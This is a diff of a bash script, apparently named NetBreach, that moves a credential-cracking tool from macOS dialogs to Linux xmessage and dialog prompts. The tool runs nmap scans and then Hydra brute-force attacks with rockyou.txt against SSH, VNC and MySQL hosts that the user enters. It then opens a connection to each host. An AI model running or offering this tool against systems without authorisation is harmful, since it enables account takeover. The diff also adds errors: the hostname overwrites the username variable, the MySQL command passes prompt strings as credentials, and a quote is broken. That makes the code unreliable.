@@ -11,13 +11,15 @@ fi
 
 # Function to handle cleanup and exit when Ctrl+C is pressed
 EXIT_PROGRAM_WITH_CTRL_C() {
-    osascript -e 'display notification "Exiting Software..." with title "Exit Notification"'  # Display exit notification
+    xmessage -center -title "Exiting" "Exiting Software..."  # Notify of missing service specification
+    sleep 1  # Simulate waiting time
     exit 1
 }
 
 # Function to handle cleanup and exit when Ctrl+Z is pressed
 EXIT_PROGRAM_WITH_CTRL_Z(){
-    osascript -e 'display notification "Exiting Software..." with title "Exit Notification"'  # Display exit notification
+    xmessage -center -title "Exiting" "Exiting Software..."  # Notify of missing service specification
+    sleep 1  # Simulate waiting time
     exit 1
 }
 
@@ -49,28 +51,30 @@ hostName="Input Hostname:"  # Message for hostname prompt
 command_exists() {
     command -v "$1" >/dev/null 2>&1
 }
-
-# Loop through required packages and check if they are installed
-for package in "${required_packages[@]}"; do
-    if ! command_exists "${package}"; then
-        # Prompt the user to install missing package
-        osascript -e "display dialog \"The required package '$package' is not installed. Would you like me to install it for you?\" buttons {\"Yes\", \"No\"} default button \"Yes\""
-        choice=$(osascript -e "button returned of result")
-
-        if [ "$choice" == "Yes" ]; then
-            bash requirements.sh  # Run script to install missing packages
-            exit 1
-        else
-            osascript -e 'display notification "Stopping program due to missing package." with title "Program Stopped"'  # Notify user of program stop
-            exit 1
+# check if the user has put --skip in the arguemnts 
+if [[ "$1" == "--skip" ]]; then
+    echo "Skipping package check"
+    sleep 4
+else
+    # Loop through required packages and check if they are installed
+    for package in "${required_packages[@]}"; do
+        if ! command_exists "${package}"; then
+            # Prompt the user to install missing package
+            response=$(xmessage -buttons "Yes:0,No:1" "Do you want to install the required package?")
+            if [ "$?" -eq 0 ]; then
+                bash requirements.sh  # Run script to install missing packages
+                exit 1
+            else
+                exit 1
+            fi
         fi
-    fi
-done
-
+    done
+fi
 # Check if the script is run with --help or -h; display help info if true
 if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
     # Display help information about the program
-    osascript -e 'display dialog "This program helps crack passwords using Hydra and Nmap.\nTo use the program, specify the port to scan, and it will check for open ports and attempt to crack passwords." buttons {"OK"} default button "OK"'
+    xmessage -center -title "HELP" "This program helps crack passwords using Hydra and Nmap.\nTo use the program, specify the port to scan, and it will check for open ports and attempt to crack passwords.""  # Notify of missing service specification"
+
 else
     # Check if the OS type matches the expected OS type
     if [[ "$OSTYPE" == "${OS}"* ]]; then
@@ -78,10 +82,12 @@ else
         # Function to scan ports
         NetBreach() {
             figlet -f slant "${NameOfProgram}"  # Display program name in ASCII art
-            options_text="Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\nIf you want to stop the program, type 'stop'."
+            options_text="Type the number of the\port you want to scan\(SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'.\If you want to stop the program, type 'stop'." >> help.txt
+            open help.txt  # Open help file
             # Prompt user for port number to scan
-            service=$(osascript -e "display dialog \"$options_text\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
-            
+            xmessage -center -title "INFO" "${options_text}"  # Notify of missing service specification"
+            service=$(dialog --inputbox "${userName}" 8 40 3>&1 1>&2 2>&3)
+
             # Exit if user types 'stop'
             if [[ "${service}" == "stop" ]]; then
                 osascript -e 'display notification "Stopping program." with title "Program Stopped"'
@@ -93,7 +99,7 @@ else
             # Check if the user wants to scan all ports
             if [[ "${service}" == "ALL" ]]; then
                 osascript -e 'display notification "Scanning all ports. This may take up to 1 hour to complete." with title "Port Scan"'  # Notify user about the scan duration
-                sudo nmap 192.168.1.1/24 -Pn -oN scan.txt --open  # Run Nmap scan for all ports
+                sudo nmap 127.0.0.1/24 -Pn -oN scan.txt --open  # Run Nmap scan for all ports
                 # Prompt user for Hydra command input
                 Hydra_input=$(osascript -e "display dialog \"Input Hydra command to use a custom hacking technique.\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
 
@@ -111,7 +117,7 @@ else
             else
                 # Scan the specified port and save the output to a log file
                 osascript -e "display notification \"Scanning port ${service}.\" with title \"Port Scan\""
-                nmap 192.168.1.1/24 -p "${service}" -oN "${service}.log" --open
+                nmap 127.0.0.1 -p "${service}" -oN "${service}.log" --open
                 # Prompt user to open the log file after scanning
                 OpenFileOrNo=$(osascript -e "display dialog \"Would you like to open the file ${service}.log?\" buttons {\"Yes\", \"No\"} default button \"Yes\"" -e 'button returned of result')
 
@@ -127,12 +133,11 @@ else
         # Function to collect user and host information for further actions
         RunHackingCommand() {
             # Notify user about specific input requirements based on services
-            osascript -e 'display notification "Hacking command" with title "To crack VNC(5900), leave Input Username empty. To crack MySQL(3306), type localhost in Input Hostname"'
-            
+            xmessage "Hacking command" "To crack SSH(22) Type the username and hostname in the input field" "To crack VNC(5900), leave Input Username empty. To crack MySQL(3306), type localhost in Input Hostname"
             # Prompt for username
-            user=$(osascript -e "display dialog \"$userName\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
+            user=$(dialog --inputbox "${userName}" 8 40 3>&1 1>&2 2>&3)
             # Prompt for hostname
-            host=$(osascript -e "display dialog \"$hostName\" default answer \"\" buttons {\"OK\"} default button \"OK\"" -e 'text returned of result')
+            user=$(dialog --inputbox "${hostName}" 8 40 3>&1 1>&2 2>&3)
         }
 
         # Function to crack VNC passwords
@@ -141,14 +146,14 @@ else
             if [[ $service == 5900 || $service == "VNC" ]]; then
                 # Validate that required fields are filled
                 if [[ $user == "" && $host == "" || $host == "" ]]; then
-                    osascript -e 'display notification "No service specified." with title "Error"'  # Notify of missing service specification
+                    xmessage -center -title "ERROR" "No service specified."  # Notify of missing service specification
                     NetBreach  # Restart port scanning function
                 else
                     # Run Hydra for VNC password cracking
                     hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host"
-                    osascript -e "display notification \"Connecting to ${host}. Please wait...\" with title \"Connecting to VNC Server\""
+                    xmessage -center -title "Connecting to VNC Server" "Connecting to ${host}. Please wait..."
                     sleep 5  # Simulate waiting time
-                    osascript -e "display notification \"Connected to ${host}. Enter the password to continue...\" with title \"VNC Connection\""
+                    xmessage -center -title "VNC CONNECTED" "Connected to ${host} Enter the password to continue..."
                     open "vnc://${host}"  # Open VNC connection
                     exit 1
                 fi
@@ -161,14 +166,15 @@ else
             if [[ $service == 22 || $service == "SSH" ]]; then
                 # Validate that required fields are filled
                 if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
-                    osascript -e 'display notification "No service specified." with title "Error"'  # Notify of missing service specification
+                    xmessage -center -title "ERROR" "No service specified."  # Notify of missing service specification
+
                     NetBreach  # Restart port scanning function
                 else
                     # Run Hydra for SSH password cracking
-                    hydra -l "$user" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
-                    osascript -e "display notification \"Connecting to ${user}. Please wait...\" with title \"Connecting to SSH Server\""
+                    hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"${host}"
+                    xmessage -center -title "Connecting to SSH Server" "Connecting to ${user}. Please wait..."  # Notify of missing service specification
                     sleep 5  # Simulate waiting time
-                    osascript -e "display notification \"Connected to ${user}. Enter the password to continue...\" with title \"SSH Connection\""
+                    xmessage -center -title "SSH Connection" "Connected to ${user}. Enter the password to continue..."  # Notify of missing service specification
                     ssh "${user}"@"${host}"  # Open SSH connection
                 fi
             fi
@@ -180,12 +186,12 @@ else
             if [[ $service == 3306 || $service == "mysql" ]]; then
                 # Validate that required fields are filled
                 if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
-                    osascript -e 'display notification "No service specified." with title "Error"'  # Notify of missing service specification
+                    xmessage -center -title "ERROR" "No service specified."  # Notify of missing service specification
                     NetBreach  # Restart port scanning function
                 else
                     # Run Hydra for MySQL password cracking
                     hydra -l "$userName" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"$hostName"
-                    osascript -e "display notification \"Connecting to ${user}. Please wait...\" with title \"Connecting to MySQL Server\""
+                    xmessage "Connecting to ${user}. Please wait...\" with title \"Connecting to MySQL Server\""
                     sleep 3  # Simulate waiting time
                     mysql -u "${userName}" -p -A  # Open MySQL connection
                 fi
